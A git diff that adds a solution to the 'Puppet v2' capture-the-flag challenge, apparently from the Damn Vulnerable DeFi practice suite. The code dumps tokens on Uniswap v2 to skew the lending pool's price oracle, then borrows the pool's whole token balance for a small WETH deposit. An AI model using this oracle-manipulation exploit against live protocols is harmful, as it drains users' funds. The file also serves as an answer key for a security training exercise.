@@ -83,6 +83,24 @@ describe('[Challenge] Puppet v2', function () {
 
     it('Execution', async function () {
         /** CODE YOUR SOLUTION HERE */
+        // very similar to puppet 1 just update for uniswap v2 API
+        await token.connect(player).approve(uniswapRouter.address, PLAYER_INITIAL_TOKEN_BALANCE);
+
+        await uniswapRouter.connect(player).swapExactTokensForETH(
+            PLAYER_INITIAL_TOKEN_BALANCE,          // swap all our tokens for eth
+            1,                                     // min eth back
+            [token.address, uniswapRouter.WETH()], // swap token -> eth
+            player.address,                        // eth -> player
+            Date.now()+100                         // deadline soon
+        );
+
+        const dep = await lendingPool.calculateDepositOfWETHRequired(POOL_INITIAL_TOKEN_BALANCE);
+
+        // convert eth to weth & approve pool to spend player's weth
+        await weth.connect(player).deposit({value: dep});
+        await weth.connect(player).approve(lendingPool.address, dep);
+
+        await lendingPool.connect(player).borrow(POOL_INITIAL_TOKEN_BALANCE);
     });
 
     after(async function () {
